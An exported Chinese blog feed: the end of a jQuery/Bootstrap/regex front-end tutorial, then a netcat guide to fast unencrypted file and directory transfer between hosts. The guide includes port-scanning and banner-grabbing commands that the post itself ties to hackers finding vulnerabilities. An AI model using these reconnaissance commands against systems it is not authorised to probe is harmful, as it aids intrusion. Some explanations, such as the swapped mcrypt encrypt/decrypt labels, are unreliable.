合并写法：return false;10.14 事件委托事件委托就是利用冒泡的原理，把事件加到父级上，通过判断事件来源的子集，执行相应的操作，事件委托首先可以极大减少事件绑定次数，提高性能；其次可以让新加入的子元素也可以拥有相同的操作。10.14.1 一般绑定事件的写法1234567891011121314$(function()&#123; $ali = $('#list li'); $ali.click(function() &#123; $(this).css(&#123;background:'red'&#125;); &#125;);&#125;)...&lt;ul id="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;10.14.2 事件委托的写法1234567891011121314$(function()&#123; $list = $('#list'); $list.delegate('li', 'click', function() &#123; $(this).css(&#123;background:'red'&#125;); &#125;);&#125;)...&lt;ul id="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;10.15 jquery元素节点操作10.15.1 创建节点12var $div = $('&lt;div&gt;');var $div2 = $('&lt;div&gt;这是一个div元素&lt;/div&gt;');10.15.2 插入节点1、append()和appendTo()：在现存元素的内部，从后面插入元素1234var $span = $('&lt;span&gt;这是一个span元素&lt;/span&gt;');$('#div1').append($span);......&lt;div id="div1"&gt;&lt;/div&gt;2、prepend()和prependTo()：在现存元素的内部，从前面插入元素3、after()和insertAfter()：在现存元素的外部，从后面插入元素4、before()和insertBefore()：在现存元素的外部，从前面插入元素10.15.3 删除节点1$('#div1').remove();10.16 滚轮事件与函数节流10.16.1 jquery.mousewheel插件使用jquery中没有鼠标滚轮事件，原生js中的鼠标滚轮事件不兼容，可以使用jquery的滚轮事件插件jquery.mousewheel.js。10.16.2 函数节流javascript中有些事件的触发频率非常高，比如onresize事件(jq中是resize)，onmousemove事件(jq中是mousemove)以及上面说的鼠标滚轮事件，在短事件内多处触发执行绑定的函数，可以巧妙地使用定时器来减少触发的次数，实现函数节流。10.17 jsonjson是 JavaScript Object Notation 的首字母缩写，单词的意思是javascript对象表示法，这里说的json指的是类似于javascript对象的一种数据格式，目前这种数据格式比较流行，逐渐替换掉了传统的xml数据格式。javascript自定义对象：1234567var oMan = &#123; name:'tom', age:16, talk:function(s)&#123; alert('我会说'+s); &#125;&#125;json格式的数据：1234&#123; "name":"tom", "age":18&#125;与json对象不同的是，json数据格式的属性名称和字符串值需要用双引号引起来，用单引号或者不用引号会导致读取数据错误。json的另外一个数据格式是数组，和javascript中的数组字面量相同。1["tom",18,"programmer"]10.18 ajax与jsonpajax技术的目的是让javascript发送http请求，与后台通信，获取数据和信息。ajax技术的原理是实例化xmlhttp对象，使用此对象与后台通信。ajax通信的过程不会影响后续javascript的执行，从而实现异步。10.18.1 同步和异步现实生活中，同步指的是同时做几件事情，异步指的是做完一件事后再做另外一件事，程序中的同步和异步是把现实生活中的概念对调，也就是程序中的异步指的是现实生活中的同步，程序中的同步指的是现实生活中的异步。10.18.2 局部刷新和无刷新ajax可以实现局部刷新，也叫做无刷新，无刷新指的是整个页面不刷新，只是局部刷新，ajax可以自己发送http请求，不用通过浏览器的地址栏，所以页面整体不会刷新，ajax获取到后台数据，更新页面显示数据的部分，就做到了页面局部刷新。10.18.3 同源策略ajax请求的页面或资源只能是同一个域下面的资源，不能是其他域的资源，这是在设计ajax时基于安全的考虑。特征报错提示：123XMLHttpRequest cannot load https://www.baidu.com/. No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource. Origin &apos;null&apos; is therefore not allowed access.10.18.4 $.ajax使用方法常用参数：1、url 请求地址2、type 请求方式，默认是’GET’，常用的还有’POST’3、dataType 设置返回的数据格式，常用的是’json’格式，也可以设置为’html’4、data 设置发送给服务器的数据5、success 设置请求成功后的回调函数6、error 设置请求失败后的回调函数7、async 设置是否异步，默认值是’true’，表示异步以前的写法：123456789101112$.ajax(&#123; url: 'js/data.json', type: 'GET', dataType: 'json', data:&#123;'aa':1&#125; success:function(data)&#123; alert(data.name); &#125;, error:function()&#123; alert('服务器超时，请重试！'); &#125;&#125;);新的写法(推荐)：1234567891011121314$.ajax(&#123; url: &apos;js/data.json&apos;, type: &apos;GET&apos;, dataType: &apos;json&apos;, data:&#123;&apos;aa&apos;:1&#125;&#125;).done(function(data) &#123; alert(data.name);&#125;).fail(function() &#123; alert(&apos;服务器超时，请重试！&apos;);&#125;);// data.json里面的数据： &#123;&quot;name&quot;:&quot;tom&quot;,&quot;age&quot;:18&#125;10.18.5 jsonpajax只能请求同一个域下的数据或资源，有时候需要跨域请求数据，就需要用到jsonp技术，jsonp可以跨域请求数据，它的原理主要是利用了标签可以跨域链接资源的特性。jsonp和ajax原理完全不一样，不过jquery将它们封装成同一个函数。 1234567891011121314$.ajax(&#123; url:'js/data.js', type:'get', dataType:'jsonp', jsonpCallback:'fnBack'&#125;).done(function(data)&#123; alert(data.name);&#125;).fail(function() &#123; alert('服务器超时，请重试！');&#125;);// data.js里面的数据： fnBack(&#123;"name":"tom","age":18&#125;); 12345678910111213141516171819202122232425$(function()&#123; $('#txt01').keyup(function()&#123; var sVal = $(this).val(); $.ajax(&#123; url:'https://sug.so.360.cn/suggest?', type:'get', dataType:'jsonp', data: &#123;word: sVal&#125; &#125;) .done(function(data)&#123; var aData = data.s; $('.list').empty(); for(var i=0;i&lt;aData.length;i++) &#123; var $li = $('&lt;li&gt;'+ aData[i] +'&lt;/li&gt;'); $li.appendTo($('.list')); &#125; &#125;) &#125;)&#125;)//......&lt;input type="text" name="" id="txt01"&gt;&lt;ul class="list"&gt;&lt;/ul&gt; 10.19 本地存储本地存储分为cookie，以及新增的localStorage和sessionStorage 1、cookie 存储在本地，容量最大4k，在同源的http请求时携带传递，损耗带宽，可设置访问路径，只有此路径及此路径的子路径才能访问此cookie，在设置的过期时间之前有效。 1234jquery 设置cookie$.cookie('mycookie','123',&#123;expires:7,path:'/'&#125;);jquery 获取cookie$.cookie('mycookie'); 2、localStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在所有同源窗口中共享，数据一直有效，除非人为删除，可作为长期数据。 12345678910//设置：localStorage.setItem("dat", "456");localStorage.dat = '456';//获取：localStorage.getItem("dat");localStorage.dat//删除localStorage.removeItem("dat"); 3、sessionStorage 存储在本地，容量为5M或者更大，不会在请求时候携带传递，在同源的当前窗口关闭前有效。 localStorage 和 sessionStorage 合称为Web Storage , Web Storage支持事件通知机制，可以将数据更新的通知监听者，Web Storage的api接口使用更方便。 iPhone的无痕浏览不支持Web Storage，只能用cookie。 10.20 jqueryUIjQuery UI是以 jQuery 为基础的代码库。包含底层用户交互、动画、特效和可更换主题的可视控件。我们可以直接用它来构建具有很好交互性的web应用程序。 jqueryUI 网址http://jqueryui.com/ 11.移动端库和框架11.1 移动端js事件移动端的操作方式和PC端是不同的，移动端主要用手指操作，所以有特殊的touch事件，touch事件包括如下几个事件： 1、touchstart: //手指放到屏幕上时触发2、touchmove: //手指在屏幕上滑动式触发3、touchend: //手指离开屏幕时触发4、touchcancel: //系统取消touch事件的时候触发，比较少用 移动端一般有三种操作，点击、滑动、拖动，这三种操作一般是组合使用上面的几个事件来完成的，所有上面的4个事件一般很少单独使用，一般是封装使用来实现这三种操作，可以使用封装成熟的js库。 11.2 zeptojsZepto是一个轻量级的针对现代高级浏览器的JavaScript库， 它与jquery有着类似的api。 如果你会用jquery，那么你也会用zepto。Zepto的一些可选功能是专门针对移动端浏览器的；它的最初目标是在移动端提供一个精简的类似jquery的js库。 zepto官网：http://zeptojs.com/zepto中文api：http://www.css88.com/doc/zeptojs_api/zepto包含很多模块，默认下载版本包含的模块有Core, Ajax, Event, Form, IE模块，如果还需要其他的模块，可以自定义构建。zepto自定义构建地址：http://github.e-sites.nl/zeptobuilder/ 11.3 swiperswiper.js是一款成熟稳定的应用于PC端和移动端的滑动效果插件，一般用来触屏焦点图、触屏整屏滚动等效果。 swiper分为2.x版本和3.x版本，2.x版本支持低版本浏览器(IE7)，3.x放弃支持低版本浏览器，适合应用在移动端。 2.x版本中文网址：http://2.swiper.com.cn/3.x版本中文网地址：http://www.swiper.com.cn/ 11.3.1 swiper使用方法：123456789101112131415161718192021222324252627282930313233343536&lt;script type="text/javascript" src="js/swiper.min.js"&gt;&lt;/script&gt;&lt;!-- 如果页面引用了jquery或者zepto，就引用 swiper.jquery.min.js,它的容量比swiper.min.js &lt;script src="path/to/swiper.jquery.min.js"&gt;&lt;/script&gt;--&gt;......&lt;link rel="stylesheet" type="text/css" href="css/swiper.min.css"&gt;......&lt;div class="swiper-container"&gt; &lt;div class="swiper-wrapper"&gt; &lt;div class="swiper-slide"&gt;slider1&lt;/div&gt; &lt;div class="swiper-slide"&gt;slider2&lt;/div&gt; &lt;div class="swiper-slide"&gt;slider3&lt;/div&gt; &lt;/div&gt; &lt;div class="swiper-pagination"&gt;&lt;/div&gt; &lt;div class="swiper-button-prev"&gt;&lt;/div&gt; &lt;div class="swiper-button-next"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var swiper = new Swiper('.swiper-container', &#123; pagination: '.swiper-pagination', prevButton: '.swiper-button-prev', nextButton: '.swiper-button-next', initialSlide :1, paginationClickable: true, loop: true, autoplay:3000, autoplayDisableOnInteraction:false&#125;);&lt;/script&gt; 11.13.2 swiper使用参数：1、initialSlide：初始索引值，从0开始2、direction：滑动方向 horizontal | vertical3、speed：滑动速度，单位ms4、autoplay：设置自动播放及播放时间5、autoplayDisableOnInteraction：用户操作swipe后是否还自动播放，默认是true，不再自动播放6、pagination：分页圆点7、paginationClickable：分页圆点是否点击8、prevButton：上一页箭头9、nextButton：下一页箭头10、loop：是否首尾衔接 11.4 bootstrap简单、直观、强悍的前端开发框架，让web开发更迅速、简单。 来自Twitter，是目前很受欢迎的前端框架之一。 Bootrstrap是基于HTML、CSS、JavaScript的，让书写代码更容易。 移动优先，响应式布局开发。 bootstrap中文网址：http://www.bootcss.com/ 11.4.1 bootstrap 容器 container-fluid 流体 container 1170 970 750 100% 12&lt;div class=&quot;container-fluid&quot;&gt;流体容器&lt;/div&gt;&lt;div class=&quot;container&quot;&gt;响应式固定容器&lt;/div&gt; 11.4.2 bootstrap响应式查询区间1、大于等于7682、大于等于9923、大于等于1200 11.4.3 bootstrap 栅格系统bootstrap将页面横向分为12等分，按照12等分定义了适应不同宽度等分的样式类，这些样式类组成了一套响应式、移动设备优先的流式栅格系统： 1、col-lg- 大于1200排成一行，小于1200分别占一行2、col-md- 大于992排成一行，小于992分别占一行3、col-sm- 大于768排成一行，小于768分别占一行4、col-xs- 始终排列成一行 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;style type="text/css"&gt; div[class*='col-']&#123; background-color:cyan; border:1px solid #ddd; height:50px; &#125;&lt;/style&gt;......&lt;div class="container"&gt; &lt;div class="row"&gt; &lt;div class="col-lg-3"&gt;col-lg-3&lt;/div&gt; &lt;div class="col-lg-3"&gt;col-lg-3&lt;/div&gt; &lt;div class="col-lg-5"&gt;col-lg-5&lt;/div&gt; &lt;div class="col-lg-1"&gt;col-lg-1&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;br&gt; &lt;div class="row"&gt; &lt;div class="col-md-3"&gt;col-md-3&lt;/div&gt; &lt;div class="col-md-3"&gt;col-md-3&lt;/div&gt; &lt;div class="col-md-3"&gt;col-md-3&lt;/div&gt; &lt;div class="col-md-3"&gt;col-md-3&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;br&gt; &lt;div class="row"&gt; &lt;div class="col-sm-3"&gt;col-sm-3&lt;/div&gt; &lt;div class="col-sm-3"&gt;col-sm-3&lt;/div&gt; &lt;div class="col-sm-3"&gt;col-sm-3&lt;/div&gt; &lt;div class="col-sm-3"&gt;col-sm-3&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;br&gt; &lt;div class="row"&gt; &lt;div class="col-xs-3"&gt;col-xs-3&lt;/div&gt; &lt;div class="col-xs-3"&gt;col-xs-3&lt;/div&gt; &lt;div class="col-xs-3"&gt;col-xs-3&lt;/div&gt; &lt;div class="col-xs-3"&gt;col-xs-3&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 11.4.4 列偏移1、col-lg-offset-2、col-md-offset-3、col-sm-offset-4、col-xs-offset- 11.4.5 bootstrap 按钮1、btn 声明按钮2、btn-default 默认按钮样式3、btn-primay4、btn-success5、btn-info6、btn-warning7、btn-danger8、btn-link9、btn-lg10、btn-md11、btn-xs12、btn-block 宽度是父级宽100%的按钮13、active14、disabled15、btn-group 定义按钮组 1234567891011121314151617181920212223242526272829&lt;!-- 一般按钮组 --&gt;&lt;div class="btn-group"&gt; &lt;input type="button" name="" value="按钮一" class="btn btn-primary"&gt; &lt;input type="button" name="" value="按钮二" class="btn btn-warning"&gt; &lt;input type="button" name="" value="按钮三" class="btn btn-danger"&gt;&lt;/div&gt;&lt;!-- 通栏按钮组 如果用input标签做按钮，需要将它用 btn-group的容器包起来--&gt;&lt;div class="btn-group btn-group-justified"&gt; &lt;div class="btn-group"&gt; &lt;input type="button" name="" value="按钮一" class="btn btn-primary"&gt; &lt;/div&gt; &lt;div class="btn-group"&gt; &lt;input type="button" name="" value="按钮二" class="btn btn-warning"&gt; &lt;/div&gt; &lt;div class="btn-group"&gt; &lt;input type="button" name="" value="按钮三" class="btn btn-danger"&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- 通栏按钮组，如果用a标签做按钮，就不用上面的结构，直接写--&gt;&lt;div class="btn-group btn-group-justified"&gt; &lt;a href="#" class="btn btn-primary"&gt;按钮一&lt;/a&gt; &lt;a href="#" class="btn btn-default"&gt;按钮二&lt;/a&gt; &lt;a href="#" class="btn btn-default"&gt;按钮三&lt;/a&gt;&lt;/div&gt; 11.4.6 bootstrap 表单1、form 声明一个表单域2、form-inline 内联表单域3、form-horizontal 水平排列表单域4、form-group 表单组、包括表单文字和表单控件5、form-control 文本输入框、下拉列表控件样式6、checkbox checkbox-inline 多选框样式7、radio radio-inline 单选框样式8、input-group 表单控件组9、input-group-addon 表单控件组物件样式10、input-group-btn 表单控件组物件为按钮的样式11、form-group-lg 大尺寸表单12、form-group-sm 小尺寸表单 123456789101112131415161718192021222324252627282930313233343536&lt;!-- 表单 --&gt;&lt;form role="form"&gt; &lt;div class="form-group form-group-lg"&gt; &lt;label for="exampleInputEmail1"&gt;Email address&lt;/label&gt; &lt;input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter email"&gt; &lt;/div&gt; &lt;div class="form-group"&gt; &lt;label for="exampleInputPassword1"&gt;Password&lt;/label&gt; &lt;input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password"&gt; &lt;/div&gt; &lt;div class="form-group"&gt; &lt;label for="exampleInputFile"&gt;File input&lt;/label&gt; &lt;input type="file" id="exampleInputFile"&gt; &lt;p class="help-block"&gt;Example block-level help text here.&lt;/p&gt; &lt;/div&gt; &lt;div class="checkbox"&gt; &lt;label&gt; &lt;input type="checkbox"&gt; Check me out &lt;/label&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-default"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;!-- 表单控件组 --&gt;&lt;div class="input-group"&gt; &lt;input type="text" class="form-control"&gt; &lt;span class="input-group-addon"&gt;@&lt;/span&gt;&lt;/div&gt;&lt;!-- 表单控件组 --&gt;&lt;div class="input-group"&gt; &lt;input type="text" class="form-control"&gt; &lt;span class="input-group-btn"&gt; &lt;button class="btn btn-default" type="button"&gt;Go!&lt;/button&gt; &lt;/span&gt;&lt;/div&gt; 11.4.7 bootstrap 图片img-responsive 声明响应式图片 11.4.8 bootstrap 字体图标通过字体代替图标，font文件夹需要和css文件夹在同一目录 11.4.9 bootstrap 导航条1、navbar 声明导航条2、navbar-default 声明默认的导航条样式3、navbar-inverse 声明反白的导航条样式4、navbar-static-top 去掉导航条的圆角5、navbar-fixed-top 固定到顶部的导航条6、navbar-fixed-bottom 固定到底部的导航条7、navbar-header 申明logo的容器8、navbar-brand 针对logo等固定内容的样式11、nav navbar-nav 定义导航条中的菜单12、navbar-form 定义导航条中的表单13、navbar-btn 定义导航条中的按钮14、navbar-text 定义导航条中的文本15、navbar-left 菜单靠左16、navbar-right 菜单靠右 123456789101112131415161718192021222324252627282930&lt;!-- 可伸缩菜单 data-target="#.." 需要加# --&gt;&lt;div class="navbar navbar-inverse navbar-static-top "&gt; &lt;div class="container"&gt; &lt;div class="navbar-header"&gt; &lt;button class="navbar-toggle" data-toggle="collapse" data-target="#mymenu"&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a href="#" class="navbar-brand"&gt;LOGO&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="mymenu"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="#"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;公司新闻&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;行业动态&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;form class="navbar-form navbar-right"&gt; &lt;div class="form-group"&gt; &lt;div class="input-group"&gt; &lt;input type="text" class="form-control"&gt; &lt;span class="input-group-btn"&gt; &lt;button class="btn btn-default" type="button"&gt;Go!&lt;/button&gt; &lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 11.4.10 路径导航12345&lt;ol class="breadcrumb"&gt; &lt;li&gt;&lt;a href="#"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;Library&lt;/a&gt;&lt;/li&gt; &lt;li class="active"&gt;Data&lt;/li&gt;&lt;/ol&gt; 11.4.11 巨幕12345&lt;div class="jumbotron"&gt; &lt;div class="container"&gt; ... &lt;/div&gt;&lt;/div&gt; 11.4.12 bootstrap 模态框1、modal 声明一个模态框2、modal-dialog 定义模态框尺寸3、modal-lg 定义大尺寸模态框4、modal-sm 定义小尺寸模态框5、modal-header6、modal-body7、modal-footer 123456789101112131415161718&lt;button class="btn btn-primary" data-toggle="modal" data-target="#mymodal"&gt;大弹出框按钮&lt;/button&gt;&lt;div class="modal fade" id="mymodal"&gt; &lt;div class="modal-dialog modal-lg"&gt; &lt;div class="modal-content"&gt; &lt;div class="modal-header"&gt; 大尺寸弹出框 &lt;/div&gt; &lt;div class="modal-body"&gt; 模态框主体 &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;Close&lt;/button&gt; &lt;button type="button" class="btn btn-primary"&gt;Save changes&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 11.4.13 bootstrap 下拉菜单1、dropdown-toggle2、dropdown-menu 12345678910111213&lt;div class="row"&gt; &lt;div class="dropdown"&gt; &lt;div class="btn btn-primary dropdown-toggle" data-toggle="dropdown"&gt; 下拉菜单 &lt;span class="caret"&gt;&lt;/span&gt; &lt;/div&gt; &lt;ul class="dropdown-menu"&gt; &lt;li&gt;&lt;a href="#"&gt;菜单一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;菜单二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;菜单三&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 11.4.14 bootstrap 隐藏类1、hidden-xs2、hidden-sm3、hidden-md4、hidden-lg 12. 正则表达式12.1 什么是正则表达式能让计算机读懂的字符串匹配规则。 12.2 正则表达式的写法var re=new RegExp(‘规则’, ‘可选参数’);var re=/规则/参数; 12.3 规则中的字符1）普通字符匹配：如：/a/ 匹配字符 ‘a’，/a,b/ 匹配字符 ‘a,b’ 2）转义字符匹配：\d 匹配一个数字，即0-9\D 匹配一个非数字，即除了0-9\w 匹配一个单词字符（字母、数字、下划线）\W 匹配任何非单词字符。等价于[^A-Za-z0-9_]\s 匹配一个空白符\S 匹配一个非空白符\b 匹配单词边界\B 匹配非单词边界. 匹配一个任意字符 123456var sTr01 = '123456asdf';var re01 = /\d+/;//匹配纯数字字符串var re02 = /^\d+$/;alert(re01.test(sTr01)); //弹出truealert(re02.test(sTr01)); //弹出false 12.4 量词：对左边的匹配字符定义个数? 出现零次或一次（最多出现一次）+ 出现一次或多次（至少出现一次）* 出现零次或多次（任意次）{n} 出现n次{n,m} 出现n到m次{n,} 至少出现n次 12.5 任意一个或者范围[abc123] : 匹配‘abc123’中的任意一个字符[a-z0-9] : 匹配a到z或者0到9中的任意一个字符 12.6 限制开头结尾^ 以紧挨的元素开头$ 以紧挨的元素结尾 12.7 修饰参数g： global，全文搜索，默认搜索到第一个结果接停止i： ingore case，忽略大小写，默认大小写敏感 12.8 常用函数1、test用法：正则.test(字符串) 匹配成功，就返回真，否则就返回假 2、replace用法：字符串.replace(正则，新的字符串) 匹配成功的字符去替换新的字符 12.9 正则默认规则匹配成功就结束，不会继续匹配，区分大小写 1234567891011var sTr01 = 'abcdefedcbaCef';var re01 = /c/;var re02 = /c/g;var re03 = /c/gi;var sTr02 = sTr01.replace(re01,'*');var sTr03 = sTr01.replace(re02,'*');var sTr04 = sTr01.replace(re03,'*');alert(sTr02); // 弹出 ab*defedcbaCefalert(sTr03); // 弹出 ab*defed*baCefalert(sTr04); // 弹出 ab*defed*ba*ef 12.10 常用正则规则1234567891011//用户名验证：(数字字母或下划线6到20位)var reUser = /^\w&#123;6,20&#125;$/;//邮箱验证： var reMail = /^[a-z0-9][\w\.\-]*@[a-z0-9\-]+(\.[a-z]&#123;2,5&#125;)&#123;1,2&#125;$/i;//密码验证：var rePass = /^[\w!@#$%^&amp;*]&#123;6,20&#125;$/;//手机号码验证：var rePhone = /^1[3458]\d&#123;9&#125;$/; 13. 前端性能优化从用户访问资源到资源完整的展现在用户面前的过程中，通过技术手段和优化策略，缩短每个步骤的处理时间从而提升整个资源的访问和呈现速度。网站的性能直接会影响到用户的数量，所有前端性能优化很重要。 前端性能优化分为如下几个方面： 13.1代码部署1、代码的压缩与合并2、图片、js、css等静态资源使用和主站不同域名地址存储，从而使得在传输资源时不会带上不必要的cookie信息。3、使用内容分发网络 CDN4、为文件设置Last-Modified、Expires和Etag5、使用GZIP压缩传送6、权衡DNS查找次数(使用不同域名会增加DNS查找)7、避免不必要的重定向(加”/“) 13.2 编码13.2.1 html1、使用结构清晰，简单，语义化标签2、避免空的src和href3、不要在HTML中缩放图片 13.2.2 css1、精简css选择器2、把CSS放到顶部3、避免@import方式引入样式4、css中使用base64图片数据取代图片文件，减少请求数，在线转base64网站：http://tool.css-js.com/base64.html5、使用css动画来取代javascript动画6、使用字体图标7、使用css sprite(雪碧图)8、使用svg图形9、避免使用CSS表达式 123body&#123; background-color: expression( (new Date()).getSeconds()%2 ? "#B8D4FF" : "#F08A00" ); &#125; 10、避免使用css滤镜 13.2.3 javascript1、减少引用库的个数2、使用requirejs或seajs异步加载js3、JS放到页面底部引入4、避免全局查找5、使用原生方法6、用switch语句代替复杂的if else语句7、减少语句数，比如说多个变量声明可以写成一句8、使用字面量表达式来初始化数组或者对象9、使用innerHTML取代复杂的元素注入10、使用事件代理(事件委托)11、避免多次访问dom选择集12、高频触发事件设置使用函数节流13、使用Web Storage缓存数据]]></content>
      <categories>
        <category>HTML&amp;CSS&amp;JavaScript|JQuery</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
        <tag>CSS</tag>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用nc传输超大文件]]></title>
    <url>%2F2019%2F12%2F31%2F%E4%BD%BF%E7%94%A8nc%E4%BC%A0%E8%BE%93%E8%B6%85%E5%A4%A7%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[说明linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢， 因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。 安装1. linux系统安装 # yum install -y nc | nmap-ncat ps.ubuntu自带的nc是netcat-openbsd版,不带-c/-e参数。 2. windows系统安装 (1)下载 下载netcat。下载地址：https://eternallybored.org/misc/netcat/, (2)解压文件夹 (3)将文件夹所在路径添加到用户环境变量里 (4)打开命令界面：Windows+R cmd。输入nc 命令即可 参数想要连接到某处: nc [-options] hostname port[s] [ports] … 绑定端口等待连接: nc -l port [-options] [hostname] [port] -g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个; -G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数; -h：在线帮助; -i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口; -l：使用监听模式，监控传入的资料; -n：直接使用ip地址，而不通过域名服务器; -o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存; -p&lt;通信端口&gt;：设置本地主机使用的通信端口; -r：指定源端口和目的端口都进行随机的选择; -s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址; -u：使用UDP传输协议; -v：显示指令执行过程; -w&lt;超时秒数&gt;：设置等待连线的时间; -z：使用0输入/输出模式，只在扫描通信端口时使用。 用法连接远程主机Client连接到Server的TCP 80端口: $nc -nvv 192.168.x.x 8000 Server监听本机的TCP8000端口: $nc -l 8000 超时控制: 多数情况我们不希望连接一直保持，那么我们可以使用 -w 参数来指定连接的空闲超时时间，该参数紧接一个数值，代表秒数，如果连接超过指定时间则连接会被终止。 Server: $nc -l 2389 Client: $nc -w 10 localhost 2389 该连接将在 10 秒后中断。注意: 不要在服务器端同时使用 -w 和 -l 参数，因为 -w 参数将在服务器端无效果。 端口扫描端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。 $nc -z -v -n 192.168.1.1 21-25 可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp. z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换. v 参数指详细输出. n 参数告诉netcat 不要使用DNS反向查询IP地址的域名. 以上命令会打印21到25 所有开放的端口。 $nc -v 127.0.0.1 22 localhost [127.0.0.1] 22 (ssh) open SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4 &quot;SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4&quot;为Banner信息。 Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。 但是，并不是所有的服务都会发送banner.一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。 Chat Server内网聊天,netcat提供了这样一种方法，只需要创建一个Chat服务器，一个预先确定好的端口，这样子就可以在内网聊天沟通了. Server: $nc -l 20000 netcat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。 Client:$nc 192.168.1.1 20000 不管你在机器Client上键入什么都会出现在机器Server上。 文件传输linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。 Server: $ time nc -l 20000 &lt; file.txt 命令最前面的time是用来检测该命令运行耗时的。 Client: $nc -n 192.168.1.1 20000 &gt; file.txt 我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。 在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.没有必要创建文件源作为Server，我们也可以相反的方法使用。 像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。 B作为Server Server: $nc -l 20000 &gt; file.txt Client: $nc 192.168.1.2 20000 &lt; file.txt 用nc传输有两个特点： ➤速度快 ➤传输简单，不需要登录对方服务器，不需要验证信息。 nc进度显示 若你文件实在太大，想看到传输进度，用PV yum install epel-release -y yum install pv -y cat file.txt |pv -b | nc 192.168.1.1 20000 中转文件A、B、C三台主机，A美国，C日本，C只能访问到B，不能直接访问A，B和AC互通。C要怎么才能拿到A上的文件呢？ C上执行：nc -l 9999 &gt; google_file.txt B上执行：nc -l 9999 | nc (C的外网IP) 9999 A上执行：nc (B的外网IP) 9999 &lt; google_file.txt 目录传输想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。 如果你想要通过网络传输一个目录从A到B。 Server: $tar -cvf – dir_name | nc -l 20000 Client: $nc -n 192.168.1.1 20000 | tar -xvf - 在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。 在客户端我们下载该压缩包通过netcat 管道然后打开文件。 如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。 Server: $tar -cvf – dir_name| bzip2 -z | nc -l 20000 通过bzip2压缩 Client: $nc -n 192.168.1.1 20000 | bzip2 -d |tar -xvf - 还可以把目录制作成iso文件进行传输 $ yum install mkisofs mkisofs -r -o 路径/ISO 文件名 目录文件路径 例子：mkisofs -r -o /opt/mycd.iso /home 加密通过网络发送的数据如果担心你在网络上发送数据的安全，可以在发送你的数据之前用如mcrypt的工具加密。 使用mcrypt工具加密数据。 Server: $nc localhost 20000 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt 使用mcrypt工具解密数据。 Client: $mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 20000 